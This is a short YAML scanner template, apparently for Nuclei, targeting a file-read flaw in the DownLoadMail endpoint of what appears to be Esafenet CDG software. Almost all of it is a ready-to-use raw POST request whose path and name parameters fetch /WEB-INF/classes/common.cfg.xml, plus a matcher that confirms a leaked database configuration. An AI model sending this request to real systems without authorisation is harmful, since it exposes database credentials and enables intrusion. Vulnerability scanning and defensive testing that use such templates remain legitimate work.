id: yisaitong-DownLoadMail-fileread

info:
  name: yisaitong-DownLoadMail-fileread
  author: yisaitong-DownLoadMail-fileread
  severity: high

requests:
  - raw:
      - |+
        POST /CDGServer3/esafenet/DownLoadMail HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        Connection: close

        path=/WEB-INF/classes/&name=common.cfg.xml
    matchers:
      - type: dsl
        dsl:
          - contains_all(body, '<?xml','db-config')



